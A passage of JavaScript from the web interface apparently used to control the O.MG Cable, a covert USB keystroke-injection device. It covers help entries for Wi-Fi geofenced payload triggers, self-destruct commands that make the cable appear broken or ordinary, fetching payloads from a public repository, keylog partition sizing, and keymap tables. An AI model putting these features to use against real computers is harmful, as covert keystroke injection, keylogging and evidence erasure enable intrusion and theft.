			"desc": "Run the payload if a 2.4GHz SSID/BSSID is seen. This only scans once. Optionally, specify SIGNAL for a minimum signal strength, measured in RSSi, with a range from high to low of 00 - 99 (00 being the strongest signal).",
			"code": [{
					"example": 'IF_PRESENT SSID="SSIDNAME"'
				},
				{
					"example": 'IF_PRESENT BSSID="AA:BB:CC:DD:EE:FF"'
				}
			]
		}, {
			"feat": "payloadGeofencing",
			"name": "IF_NOTPRESENT",
			"desc": "Run the payload if a 2.4GHz SSID/BSSID is not seen. This only scans once. Optionally, specify SIGNAL for a minimum signal strength, measured in RSSi, with a range of 00 - 99 (00 being the strongest signal).",
			"code": [{
					"example": 'IF_NOTPRESENT SSID="SSIDNAME"'
				},
				{
					"example": 'IF_NOTPRESENT BSSID="AA:BB:CC:DD:EE:FF"'
				}
			]
		}, {
			"feat": "payloadGeofencing",
			"name": "WAIT_FOR_PRESENT",
			"desc": "Wait for a 2.4GHz SSID/BSSID to be present before continuing the rest of the payload. Specify MINUTES for a timeout, or it will run forever. Specify INTERVAL in seconds for how often the scan will happen. An INTERVAL less than 60sec tends to make it hard for most clients to retain a connection to the Web UI.",
			"code": [{
					"example": 'WAIT_FOR_PRESENT SSID="MySSID"'
				},
				{
					"example": 'WAIT_FOR_PRESENT BSSID="AA:BB:CC:DD:EE:FF"'
				},
				{
					"example": 'WAIT_FOR_PRESENT SSID="MySSID" MINUTES="2" INTERVAL="90"'
				},
				{
					"example": 'WAIT_FOR_PRESENT BSSID="AA:BB:CC:DD:EE:FF" MINUTES="2" INTERVAL="90"'
				}
			]
		}, {
			"feat": "payloadGeofencing",
			"name": "WAIT_FOR_NOTPRESENT",
			"desc": "Wait for a 2.4GHz SSID/BSSID to NOT be present before continuing the rest of the payload. Specify MINUTES for a timeout, or it will run forever. Specify INTERVAL in seconds for how often the scan will happen. An INTERVAL less than 60sec tends to make it hard for most clients to retain a connection to the Web UI.",
			"code": [{
					"example": 'WAIT_FOR_NOTPRESENT SSID="MySSID"'
				},
				{
					"example": 'WAIT_FOR_NOTPRESENT BSSID="AA:BB:CC:DD:EE:FF"'
				},
				{
					"example": 'WAIT_FOR_NOTPRESENT SSID="MySSID" MINUTES="2" INTERVAL="90"'
				},
				{
					"example": 'WAIT_FOR_NOTPRESENT BSSID="AA:BB:CC:DD:EE:FF" MINUTES="2" INTERVAL="90"'
				}
			]
		}, {
			"feat": "selfDestruct",
			"name": "SELF-DESTRUCT 1",
			"desc": "Completely erase all data and disconnect data lines to make cable behave 'broken'. You will need to reflash the firmware to recover. You will need to reflash the firmware to recover.', warn: 'ALL SAVED CONFIGURATIONS AND PAYLOADS WILL BE ERASED!",
			"code": [{
				"example": "SELF-DESTRUCT 1"
			}]
		}, {
			"feat": "selfDestruct",
			"name": "SELF-DESTRUCT 2",
			"desc": "Erase all data, but leave data lines connected so it behaves like a normal cable. You will need to reflash the firmware to recover.', warn: 'ALL SAVED CONFIGURATIONS AND PAYLOADS WILL BE ERASED!",
			"code": [{
				"example": "SELF-DESTRUCT 2"
			}]
		}, {
			"feat": "globalKeys",
			"name": "ALT",
			"desc": "Use the ALT key.\nAliases: OPT, OPTION",
			"code": [{
				'example': 'ALT'
			}]
		}, {
			"feat": "globalKeys",
			"name": "CTRL",
			"desc": "Use the CTRL key.\nAliases: CONTROL",
			"code": [{
				'example': 'CTRL'
			}]
		}, {
			"feat": "globalKeys",
			"name": "SHIFT",
			"desc": "Use the SHIFT key.",
			"code": [{
				'example': 'SHIFT'
			}]
		}, {
			"feat": "globalKeys",
			"name": "GUI",
			"desc": "Use the GUI key.\nAliases: WIN, WINDOWS, CMD, COMMAND, META",
			"code": [{
				'example': 'GUI'
			}]
		}];

		function clearHelpElements() {
			helpElementIds.forEach(id => {
				document.getElementById(id).innerHTML = "";
			});
		}

		function addGlobalKeysToHelpMenuItems(keymapGlobalArray) {
			keymapGlobalArray.forEach((valueArray, key) => {
				valueArray.forEach(value => {
					helpMenuItems.push({
						"feat": "globalKeys",
						"name": value,
						"desc": `Use the ${value} key`,
						"code": [{
							example: value
						}],
					});
				});
			});
		}

		function createHelpElements(example) {
			const {
				feat,
				name,
				desc,
				code
			} = example;
			const parentElement = document.getElementById(`help${feat}`);

			const helpEntryElement = document.createElement("div");
			helpEntryElement.classList.add("helpEntry");

			const nameElement = document.createElement("h3");
			nameElement.textContent = name;
			nameElement.classList.add(feat);
			helpEntryElement.appendChild(nameElement);

			const descElement = document.createElement("pre");
			descElement.textContent = desc;
			descElement.classList.add(feat);
			helpEntryElement.appendChild(descElement);

			code.forEach(({
				example
			}) => {
				const codeElement = document.createElement("code");
				codeElement.textContent = example;
				codeElement.classList.add(feat);
				helpEntryElement.appendChild(codeElement);
			});

			parentElement.appendChild(helpEntryElement);
		}

		function generateHelpMenu() {
			logMessage("DEBUG", "generateHelpMenu");
			clearHelpElements();
			addGlobalKeysToHelpMenuItems(sortedKeymapGlobalArray());
			helpMenuItems.forEach(createHelpElements);
		}

		const handleHelpToPayload = event => {
			logMessage("DEBUG", `handleHelpToPayload: [event]:[${event}]`);
			const codeExample = event.target.closest("code").textContent;
			const payloadScriptArea = document.getElementById("payload");

			payloadScriptArea.value += codeExample;
			payloadScriptArea.value += "\n";
			updateLineNumbers();

			logMessage("INFO", `codeExampleToPayload: [example]:[${codeExample}] [new]:[${codeExample}]`);
		};

		async function searchGithubPayloads() {
			let input = document.getElementById('searchGithubPayloads').value;
			if (event.key === "Enter" || event.type === "click") {
				document.getElementById('githubPayloadExamples').innerHTML = "";

				let url = "https://api.github.com/repos/hak5/omg-payloads/git/trees/master?recursive=1";

				try {
					let response = await fetch(url);
					let data = await response.json();

					let files = data.tree.filter(file => file.path.toLowerCase().includes(input.toLowerCase()) && file.path.endsWith('.txt'));

					for (let file of files) {
						let fileUrl = `https://raw.githubusercontent.com/hak5/omg-payloads/master/${file.path}`;
						let fileResponse = await fetch(fileUrl);
						let fileData = await fileResponse.text();

						let h3 = document.createElement('h3');
						let span = document.createElement('span');
						let code = document.createElement('code');

						h3.textContent = file.path.split('/')[file.path.split('/').length - 2];
						span.textContent = fileUrl;
						code.textContent = fileData;

						let div = document.getElementById('githubPayloadExamples');
						div.appendChild(h3);
						div.appendChild(span);
						div.appendChild(code);
					}
					document.querySelectorAll('code').forEach(element => {
						element.addEventListener('click', handleHelpToPayload);
					});
				} catch (error) {
					document.getElementById('githubPayloadExamples').innerHTML = "Could not connect to Github.";
				}
			}
		}

		// Partition Editor Module
		function partitionEditorCurrent() {
			let cfbootscriptSize = document.getElementById("bootscript") ? document.getElementById("bootscript").value : '1';
			let cfhidxfileSize = document.getElementById("hidxfile") ? document.getElementById("hidxfile").value : '0';
			let cfpayload1Size = document.getElementById("payload1") ? document.getElementById("payload1").value : '1';
			let payloadList = document.getElementById("payload-list");
			let cfpayloadSlots = payloadList ? payloadList.querySelectorAll("option").length : 0;

			let cfpayloadSlotType = document.getElementById("payloadSlotType") ? document.getElementById("payloadSlotType").value : '1';

			document.getElementById("bootscriptSlotSize").value = cfbootscriptSize;
			document.getElementById("hidxfileSize").value = cfhidxfileSize;
			document.getElementById("payloadSlotCount").value = cfpayloadSlots;
			document.getElementById("payloadSlotSize").value = cfpayload1Size;
			document.getElementById("payloadSlotType").value = slotmode;
		}

		function generatePartitionEditor() {
			logMessage(`DEBUG`, `generatePartitionEditor`);
			let availableSpace = document.getElementById("partitionEditorAvailable").value;
			let bootslotSize = document.getElementById("bootscriptSlotSize").value;
			let hidxfileSize = document.getElementById("hidxfileSize").value;
			let slotSize = document.getElementById("payloadSlotSize").value;
			let slotCount = document.getElementById("payloadSlotCount").value;
			let payloadSlotType = document.getElementById("payloadSlotType").value;
			let existingUsed = parseInt(bootslotSize) + parseInt(hidxfileSize);

			document.getElementById("payloadSlotCount").innerHTML = "";

			let payloadList = document.getElementById("payload-list");

			listValues = generatePartitionSlotList(availableSpace, slotSize, payloadSlotType, existingUsed);
			if (slotCount == "") {
				slotCount = payloadList ? payloadList.querySelectorAll("option").length : 7;
			} else if (slotCount > listValues.length) {
				slotCount = listValues.length - 1;
			}

			listValues.forEach((values) => {
				const name = document.createElement("option");
				name.value = values;
				name.innerHTML = values;
				if (values == slotCount) {
					name.selected = true;
				}
				document.getElementById("payloadSlotCount").appendChild(name);
			});

			if (payloadSlotType === "3") {
				keylogSizeRemaining = (availableSpace - (slotSize * slotCount * 2) - (bootslotSize) - (hidxfileSize)) * 2048;
			} else {
				keylogSizeRemaining = (availableSpace - (slotSize * slotCount) - (bootslotSize) - (hidxfileSize)) * 2048;
			}
			output = document.getElementById('keylogSize');
			output.innerHTML = `${keylogSizeRemaining}`;
		}

		function generatePartitionSlotList(sectors, slotSize, slotType, existing) {
			if (slotType === "3") {
				slotSize = slotSize * 2;
			}
			let maxCount = Math.floor((sectors - existing) / slotSize);
			let listValues = [];
			for (let i = 0; i <= maxCount; i++) {
				listValues.push(i);
			}
			return listValues;
		}

		function partitionEditorApply() {
			let bootslotSize = document.getElementById("bootscriptSlotSize").value;
			let hidxfileSize = document.getElementById("hidxfileSize").value;
			let slotSize = document.getElementById("payloadSlotSize").value;
			let slotCount = document.getElementById("payloadSlotCount").value;
			let payloadSlotType = document.getElementById("payloadSlotType").value;
			let partitionEditorAvailable = document.getElementById("partitionEditorAvailable").value;

			let keylogSize = partitionEditorAvailable - (slotSize * slotCount) - 1;
			let CWInfo = document.getElementById("response-CWInfo").value;
			wifiInfo = CWInfo.split("\t");
			let wifiMODE = wifiInfo[1];
			let wifiSSID = wifiInfo[2];
			let wifiPASS = wifiInfo[3];

			let toRunMiddle = `INIT;F:keylog=0;F:payload1=0;F:payload2=0;F:payload3=0;F:payload4=0;F:payload5=0;F:payload6=0;F:payload7=0;F:bootscript=${bootslotSize};F:hidxfile=${hidxfileSize};`;
			let toRunPostfix = `F:keylog=100%F;S:wifimode=${wifiMODE};S:wifissid=${wifiSSID};S:wifikey=${wifiPASS};`;
			let toRunContent = "";
			for (let i = 0; i < slotCount; i++) {
				toRunContent += `F:payload${i + 1}=${slotSize};`;
			}
			if (payloadSlotType === "3") {
				for (let i = 0; i < slotCount; i++) {
					toRunContent += `F:exec${i + 1}=${slotSize};`;
				}
				toRunContent += `S:slotmode=3;`;
			}
			if (payloadSlotType === "2") {
				toRunContent += `S:slotmode=2;`;
			}
			let toRunInit = toRunMiddle + toRunContent + toRunPostfix;

			if (new TextEncoder().encode(toRunInit).length > 4096) {
				console.error("The message size exceeds the 4096 bytes limit.");
				return;
			}

			sendMessage(`FE127`);
			let toRunPrefixes = ["FW520192\t", "FW521216\t", "FW522240\t", "FW523264\t"];
			for (let i = 0; i < Math.ceil(toRunInit.length / 1024); i++) {
				let start = i * 1024;
				let end = start + 1024;
				let cmd = toRunPrefixes[i] + 1024 + "\t" + toRunInit.slice(start, end);
				sendMessage(`${cmd}`);
			}

			sendMessage(`CR1`);
			viewDialog(`partitionEditor`, `close`);
			viewDialog(`partitionApplied`, `open`);
		}

		// Keymap Module
		const keymapGlobal = [
			[0x00, "NOKEY"],
			[0x28, "ENTER"],
			[0x29, "ESC"],
			[0x2a, "BACKSPACE"],
			[0x2b, "TAB"],
			[0x2c, " "],
			[0x2c, "SPACE"],
			[0x39, "CAPSLOCK"],
			[0x3a, "F1"],
			[0x3b, "F2"],
			[0x3c, "F3"],
			[0x3d, "F4"],
			[0x3e, "F5"],
			[0x3f, "F6"],
			[0x40, "F7"],
			[0x41, "F8"],
			[0x42, "F9"],
			[0x43, "F10"],
			[0x44, "F11"],
			[0x45, "F12"],
			[0x46, "PRINTSCREEN"],
			[0x47, "SCROLLLOCK"],
			[0x48, "PAUSE"],
			[0x49, "INSERT"],
			[0x4a, "HOME"],
			[0x4b, "PAGEUP"],
			[0x4c, "DELETE"],
			[0x4d, "END"],
			[0x4e, "PAGEDOWN"],
			[0x4f, "RIGHT"],
			[0x4f, "RIGHTARROW"],
			[0x50, "LEFT"],
			[0x50, "LEFTARROW"],
			[0x51, "DOWN"],
			[0x51, "DOWNARROW"],
			[0x52, "UP"],
			[0x52, "UPARROW"],
			[0x53, "NUMLOCK"],
			[0x54, "KPAD_SLASH"],
			[0x55, "KPAD_ASTERISK"],
			[0x56, "KPAD_MINUS"],
			[0x57, "KPAD_PLUS"],
			[0x58, "KPAD_ENTER"],
			[0x59, "KPAD_1"],
			[0x5a, "KPAD_2"],
			[0x5b, "KPAD_3"],
			[0x5c, "KPAD_4"],
			[0x5d, "KPAD_5"],
			[0x5e, "KPAD_6"],
			[0x5f, "KPAD_7"],
			[0x60, "KPAD_8"],
			[0x61, "KPAD_9"],
			[0x62, "KPAD_0"],
			[0x63, "KPAD_DOT"],
			[0x64, "102ND"],
			[0x65, "COMPOSE"],
			[0x66, "POWER"],
			[0x67, "KPEQUAL"],
			[0x68, "F13"],
			[0x69, "F14"],
			[0x6a, "F15"],
			[0x6b, "F16"],
			[0x6c, "F17"],
			[0x6d, "F18"],
			[0x6e, "F19"],
			[0x6f, "F20"],
			[0x70, "F21"],
			[0x71, "F22"],
			[0x72, "F23"],
			[0x73, "F24"],
			[0x74, "OPEN"],
			[0x75, "HELP"],
			[0x76, "PROPS"],
			[0x77, "FRONT"],
			[0x78, "STOP"],
			[0x79, "AGAIN"],
			[0x7a, "UNDO"],
			[0x7b, "CUT"],
			[0x7c, "COPY"],
			[0x7d, "PASTE"],
			[0x7e, "FIND"],
			[0x7f, "MUTE"],
			[0x80, "VOLUMEUP"],
			[0x81, "VOLUMEDOWN"],
			[0x82, "LOCKING_CAPSLOCK"],
			[0x83, "LOCKING_NUMLOCK"],
			[0x84, "LOCKING_SCROLLLOCK"],
			[0x85, "KPAD_COMMA"],
			[0x86, "KPAD_EQUAL"],
			[0x87, "RO"],
			[0x88, "KATAKANAHIRAGANA"],
			[0x89, "YEN"],
			[0x8a, "HENKAN"],
			[0x8b, "MUHENKAN"],
			[0x8c, "KPJPCOMMA"],
			[0x8d, "INT7"],
			[0x8e, "INT8"],
			[0x8f, "INT9"],
			[0x90, "HANGEUL"],
			[0x91, "HANJA"],
			[0x92, "KATAKANA"],
			[0x93, "HIRAGANA"],
			[0x94, "ZENKAKUHANKAKU"],
			[0x95, "LANG6"],
			[0x96, "LANG7"],
			[0x97, "LANG8"],
			[0x98, "LANG9"],
			[0x99, "ALTERASE"],
			[0x9a, "SYSREQ"],
			[0x9b, "CANCEL"],
			[0x9c, "CLEAR"],
			[0x9d, "PRIOR"],
			[0x9e, "RETURN"],
			[0x9f, "SEPARATOR"],
			[0xa0, "OUT"],
			[0xa1, "OPER"],
			[0xa2, "CLEAR"],
			[0xa3, "CRSEL"],
			[0xa4, "EXSEL"],
			[0xb0, "KPAD_00"],
			[0xb1, "KPAD_000"],
			[0xb2, "KPAD_THOUSANDSSEPARATOR"],
			[0xb3, "KPAD_DECIMALSEPARATOR"],
			[0xb4, "KPAD_CURRENCYUNIT"],
			[0xb5, "KPAD_CURRENCYSUBUNIT"],
			[0xb6, "KPAD_LEFTPAREN"],
			[0xb7, "KPAD_RIGHTPAREN"],
			[0xb8, "KPAD_{"],
			[0xb9, "KPAD_}"],
			[0xba, "KPAD_Tab"],
			[0xbb, "KPAD_Backspace"],
			[0xbc, "KPAD_A"],
			[0xbd, "KPAD_B"],
			[0xbe, "KPAD_C"],
			[0xbf, "KPAD_D"],
			[0xc0, "KPAD_E"],
			[0xc1, "KPAD_F"],
			[0xc2, "KPAD_XOR"],
			[0xc3, "KPAD_^"],
			[0xc4, "KPAD_%"],
			[0xc5, "KPAD_<"],
			[0xc6, "KPAD_>"],
			[0xc7, "KPAD_&"],
			[0xc8, "KPAD_&&"],
			[0xc9, "KPAD_|"],
			[0xca, "KPAD_||"],
			[0xcb, "KPAD_:"],
			[0xcc, "KPAD_#"],
			[0xcd, "KPAD_Space"],
			[0xce, "KPAD_@"],
			[0xcf, "KPAD_!"],
			[0xd0, "KPAD_MEMSTORE"],
			[0xd1, "KPAD_MEMRECALL"],
			[0xd2, "KPAD_MEMCLEAR"],
			[0xd3, "KPAD_MEMADD"],
			[0xd4, "KPAD_MEMSUB"],
			[0xd5, "KPAD_MEMMULT"],
			[0xd6, "KPAD_MEMDIV"],
			[0xd7, "KPAD_PLUSMINUS"],
			[0xd8, "KPAD_CLEAR"],
			[0xd9, "KPAD_CLEARENTRY"],
			[0xda, "KPAD_BINARY"],
			[0xdb, "KPAD_OCTAL"],
			[0xdc, "KPAD_DECIMAL"],
			[0xdd, "KPAD_HEXADECIMAL"],
			[0xe0, "LEFTCTRL"],
			[0xe1, "LEFTSHIFT"],
			[0xe2, "LEFTALT"],
			[0xe3, "LEFTMETA"],
			[0xe4, "RIGHTCTRL"],
			[0xe5, "RIGHTSHIFT"],
			[0xe6, "RIGHTALT"],
			[0xe7, "RIGHTMETA"],
			[0xe8, "MEDIA_PLAYPAUSE"],
			[0xe9, "MEDIA_STOPCD"],
			[0xea, "MEDIA_PREVIOUSSONG"],
			[0xeb, "MEDIA_NEXTSONG"],
			[0xec, "MEDIA_EJECTCD"],
			[0xed, "MEDIA_VOLUMEUP"],
			[0xee, "MEDIA_VOLUMEDOWN"],
			[0xef, "MEDIA_MUTE"],
			[0xf0, "MEDIA_WWW"],
			[0xf1, "MEDIA_BACK"],
			[0xf2, "MEDIA_FORWARD"],
			[0xf3, "MEDIA_STOP"],
			[0xf4, "MEDIA_FIND"],
			[0xf5, "MEDIA_SCROLLUP"],
			[0xf6, "MEDIA_SCROLLDOWN"],
			[0xf7, "MEDIA_EDIT"],
			[0xf8, "MEDIA_SLEEP"],
			[0xf9, "MEDIA_COFFEE"],
			[0xfa, "MEDIA_REFRESH"],
			[0xfb, "MEDIA_CALC"],
		];
		const locale = {
			"AR_101": [' 1234567890-=\\ ', '  }] [ /    {  ~!@#$%^&*)(_+<>|:" ,. '],
			"AR_102": [' 1234567890-=>', '\\  ] [ /       ~!@#$%^&*)(_+}{ :"<,.|', '                                              '],
			"AR_FR": [' &"\'(-_)=>\\', '\\  ] [ /       ~1234567890+}{ :"<,.|', '                                              '],
			"AR_SY_P": ['1234567890-=][.', '!)(+::', '               '],
			"AR_SY_S": ['.[]1234567890-=', '!)(+::', '               '],
			"AR_US": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]`;\'<,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}~:">,.? '],
			"AS": [' - ,. ', '     !@     ()   '],
			"AZ": ['gkvsarnyliqeohpudmtfb1234567890-=xj c#z. ', 'GKVSARNYLQEOHPUIDMTFB!";%:?*()_+XJ C~Z, '],
			"AZ_C": ['1234567890-=\\`.\\', '!";%:?*()_+/~,|', '                           @                  '],
			"AZ_L": ['abcdefghijklmnopqrstuvxyz1234567890-=\\`. ', 'ABCDEFGHJKLMNOPQRSTUVXYZ!";%:?*()_+/I~, '],
			"BA": ['!:?-. ', '";()%, '],
			"BE": ['qbcdefghijkl,noparstuvzxyw&"\'(!)-^$m;:=<', 'QBCDEFGHIJKL?NOPARSTUVZXYW1234567890_*M%./+>', '                         |@#{[^  {}  []`    ~\\'],
			"BG": [',1234567890-.;(', '!?+"%=:/$)'],
			"BG_P": ['1234567890-=;\',./', '!@$%*()+:"?'],
			"BG_PT": ['1234567890-=;\',./ ', '!@$%*()_+:"<>? ', '                                              '],
			"BG_T": [',1234567890-.;(`\\', '!?+"%=:/_V)~|'],
			"BN": [' 1234567890-  ,. ', '             ()  { ', '                            ', '                                        '],
			"BN_I": [' - ,. ', '    !@     ()   '],
			"BN_IL": [' -  ,. ', '     !@      ()    '],
			"BO": ['m ', 'M ', ' '],
			"BO_U": ['m ', 'M ', '      '],
			"BR": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]~\',.;/', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%&*()_+`{}^"<>:?', '              /     ?               '],
			"BS": ['1234567890\'+`,.- ', '!"#$%&/()=?*~;:_ ', ' {  []     }  \\    @|     ^              <>  '],
			"BUG": ['1234567890-=[]\\;\'/ ', '                        !@#$%^&*()_+{}|:"~,.? '],
			"BY": ['1234567890-=\\. ', '!";%:?*()_+/, '],
			"CA": ['abcdefghijklmnopqrstuvwxyz1234567890-=^<;`#,.', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"/$%?&*()_+^>:`|\'.', '                       @[]}~{\\ '],
			"CA_FR": ['abcdefghijklmnopqrstuvwxyz1234567890-=^;,.', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%?&*()_+^:\'.', '              @{[]}|~` <>/\\', '                         `     |'],
			"CA_N": ['abcdefghijklmnopqrstuvwxyz1234567890-=^;/,.', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%?&*()_+:\\\'"', '     ]  ~  |  ', '      '],
			"CHR": ['   \'`,. ', '()" ', 'abcdefghijklmnopqrstuvwxyz1234567890-=[]\\; <>/ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|: ~  ? '],
			"CS": ['abcdefghijklmnopqrstuvwxzy+=);,.-&', 'ABCDEFGHIJKLMNOPQRSTUVWXZY1234567890%/(\'"!?:_*', ' {& []    }  \\   @|# >~^`$ <>*<'],
			"CS_101": ['abcdefghijklmnopqrstuvwxyz+=);,.-\\', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890%/(\'"!?:_|', '                         !@#$%^&*()-=[]\\;`<>/', '                                    _+{}|:^~?'],
			"CS_P": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./\\', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>?|', '                         +=);?:-', '                                    %/(^"!_'],
			"DA": ['abcdefghijklmnopqrstuvwxyz1234567890+\',.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#%&/()=?`^*;:_>', '                         @$ {[]} | ~       \\'],
			"DE": ['abcdefghijklmnopqrstuvwxzy1234567890+#^,.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXZY!"$%&/()=?`*\';:_>', '              @             {[]}\\  ~       |', '                                               '],
			"DE_CH": ['abcdefghijklmnopqrstuvwxzy1234567890\'^$,.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXZY+"*%&/()=?`!;:_>', '                         @#|  ~[]} {    \\'],
			"DV_P": ['1234567890-=][\\\'`./ ', ' !@#$%^&*)(_+}{|:"~>< ', '                                         ;  ,   '],
			"DV_T": ['1234567890-=[] `\\', '<."/>:!@#$%^&*)(_+{}~\\|', '     ,                                    ;     '],
			"DVORAK": ['axje.uidchtnmbrl\'poygk,qf;1234567890[]/=\\s-`wvz ', 'AXJE>UIDCHTNMBRL"POYGK<QF:!@#$%^&*(){}?+|S_~WVZ '],
			"DVORAK_L": ['-wgcbdthoeazin.6;ykusvqxr\'[]/pfmlj43215=\\87`,09 ', '_WGCBDTHOEAZIN>^:YKUSVQXR"{}?PFMLJ$#@!%+|*&~<)( '],
			"DVORAK_R": ['7ixzqaehutdcwnyb5.8os,60r91234jlmfp/[];=\\k-`vg\' ', '&IXZQAEHUTDCWNYB%>*OS<^)R(!@#$JLMFP?{}:+|K_~VG" '],
			"DZ": [' ', '  ', '  1234567890-=()\\;\',./ ', '      *  +:"? '],
			"EL": [';1234567890-=[]\\\'`,./ ', ':!@#$%^&*()_+{}|"~<>? ', '                              '],
			"EL_220": ['1234567890\']+}#,.-<', ':~!"$%&/()=?[*{@;:_>', '                             '],
			"EL_220L": ['abcdefghijklmnopqrstuvwxyz1234567890\']+}#\\,.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&/()=?[*{@|;:_>', '                                '],
			"EL_319": ['1234567890\'+[],.-', '!"$%/()=*;:_', '                                               '],
			"EL_319L": ['abcdefghijklmnopqrstuvwxyz1234567890\'+[]`^\\,.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&/()=?*{}@~|;:_>', '                                               '],
			"EL_L": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? ', '           ', '                         '],
			"EL_P": [';1234567890-=[]\\\'~,./ ', ':!@#$%^&*()_+{}|"`<>? ', '                         ', '                                         '],
			"ES": ['abcdefghijklmnopqrstuvwxyz1234567890\'`+,.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"$%&/()=?^*;:_>', '                          |@#        []} {\\   '],
			"ES_A": ['abcdefghijklmnopqrstuvwxyz1234567890-`\',.=<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ"/()!?+`;:%>', '$  @[]|        &       |@#_#\\*~[]}~{\\ ^ '],
			"ET": ['abcdefghijklmnopqrstuvwxyz1234567890+\',.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#%&/()=?`*~;:_>', '                        @$ {[]}\\   ^    |', '                                              '],
			"FA": ['1234567890-=./', '][\\ ,!@#$%^&*)(_+}{|:"<>|', '                                               '],
			"FA_S": ['-=\\ ./ ', ' ][! *)(+}{|: >< '],
			"FI": ['abcdefghijklmnopqrstuvwxyz1234567890+\',.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#%&/()=?`^*;:_>', '                         @$ {[]}\\  ~       |'],
			"FI_S": ['abcdefghijklmnopqrstuvwxyz1234567890+\',.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#%&/()=?`^*;:_>', '         @$ {[]}\\  ~     |', '                              '],
			"FO": ['abcdefghijklmnopqrstuvwxyz1234567890+\',.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#%&/()=?`*;:_>', '                         @$ {[]} |~  ^    \\'],
			"FR": ['qbcdefghijkl,noparstuvzxyw&"\'(-_)=^$*m;:!<', 'QBCDEFGHIJKL?NOPARSTUVZXYW1234567890+M% ./>', '                          ~#{[|`\\^@]}         '],
			"FR_CH": ['abcdefghijklmnopqrstuvwxzy1234567890\'^$,.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXZY+"*%&/()=?`!;:_>', '                         @#|  ~[]} {    \\'],
			"FTHRK": ['         0    \\ ', '                                 |       '],
			"GD": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]#;\'`,./\\', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"$%^&*()_+{}~:@`<>?|', '                                   \'   ', '                                         '],
			"GL": ['abcdefghijklmnopqrstuvwxyz1234567890+\',.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#%&/()=?`^*;:_>', '                     @$ {[]} | ~       \\', '                                              '],
			"GN": ['abcdefghijklmnopqrstuvwxyz1234567890\'+}{|,.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&/()=?*][;:_>', '            @                 \\  ~` ^   ', '                                          '],
			"GOTHIC": ['018346279eabcd905234f857 61234567890-=1a:\' ,. ', '                          !@#$%^&*()_+[]\\;"~<>/ '],
			"GU": [' 1234567890- ,. ', '          ()   ', '                                   ', '                                              '],
			"HA": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? ', '                                       ', '                                           '],
			"HAWAII": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? ', '                                     \'     ', '                                     "     '],
			"HE": ['/\'1234567890-=][\\,;. ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*)(_+}{|:"~><? ', '                                          '],
			"HE_S": ['/\'1234567890-=][\\,;. ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*)(_+}{|:"~><? ', '               ', '                                         '],
			"HI": [' 1234567890- ,.', '        () ', '                          -=[]\\;\'`,./', '                         !@#$%^&*()_+{}|:"~<>? '],
			"HR": ['abcdefghijklmnopqrstuvwxzy1234567890\'+,.- ', 'ABCDEFGHIJKLMNOPQRSTUVWXZY!"#$%&/()=?*;:_ ', ' {  []   }  \\    @|   ~^`  <>  '],
			"HU": ['abcdefghijklmnopqrstuvwxzy1234567890,.-', 'ABCDEFGHIJKLMNOPQRSTUVWXZY\'"+!%/=()?:_', '{&[] <}  \\  @|# >~^`$ ;>*<'],
			"HU_101": ['abcdefghijklmnopqrstuvwxyz123456789,.-', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ\'"+!%/=()?:;', '{&[] <}  \\   @|# >~ ^   `    \\$0;>_<'],
			"HY": [':,-.\' ', '1349() '],
			"HY_P": ['-;,/', '"<>', '                          1234567890-=[]\\;\'`,./', '                          !@#$%^&*()_+{}|:"~<>? '],
			"HY_T": ['-,) ', ' ( ', '                          1234567890-=[]\\;\'`,./ ', '                          !@#$%^&*()_+{}|:"~<>? '],
			"HY_W": [':,-.\' ', '1349() '],
			"IE": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]#;\'`,./\\', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"$%^&*()_+{}~:@<>?|', '                                       ', '                                     `    '],
			"IG": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? ', '                                      ', '                                            '],
			"IN_EN": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? ', '                    -           ', '                             '],
			"IN_SD": ['1234567890-,.', '      ()', '                         ', '                                       '],
